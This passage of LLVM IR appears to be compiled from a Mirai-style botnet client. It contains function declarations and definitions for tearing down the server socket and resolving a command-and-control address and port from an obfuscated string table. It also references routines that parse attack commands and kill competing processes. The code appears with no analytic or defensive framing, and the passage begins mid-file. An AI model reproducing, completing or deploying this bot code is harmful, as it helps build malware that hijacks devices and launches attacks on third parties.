declare i64 @send(i32, i8*, i64, i32) #0

declare i32 @accept(i32, %struct.sockaddr*, i32*) #0

declare void @killer_kill() #0

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @teardown_connection() #1 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp ne i32 %1, -1
  br i1 %2, label %3, label %6

3:                                                ; preds = %0
  %4 = load i32, i32* @fd_serv, align 4
  %5 = call i32 @close(i32 %4)
  br label %6

6:                                                ; preds = %3, %0
  store i32 -1, i32* @fd_serv, align 4
  %7 = call i32 @sleep(i32 1)
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #4

declare i64 @recv(i32, i8*, i64, i32) #0

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #4

declare void @attack_parse(i8*, i32) #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @resolve_cnc_addr() #1 {
  call void @table_unlock_val(i8 zeroext 1)
  %1 = call i32 @inet_addr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.2, i64 0, i64 0)) #5
  store i32 %1, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %2 = call i8* @table_retrieve_val(i32 1, i32* null)
  %3 = bitcast i8* %2 to i16*
  %4 = load i16, i16* %3, align 2
  store i16 %4, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  call void @table_lock_val(i8 zeroext 1)
  ret void
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

declare i32 @fcntl(i32, i32, ...) #0

declare i32 @connect(i32, %struct.sockaddr*, i32) #0

attributes #0 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { nounwind }
attributes #6 = { noreturn nounwind }
attributes #7 = { nounwind readnone willreturn }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
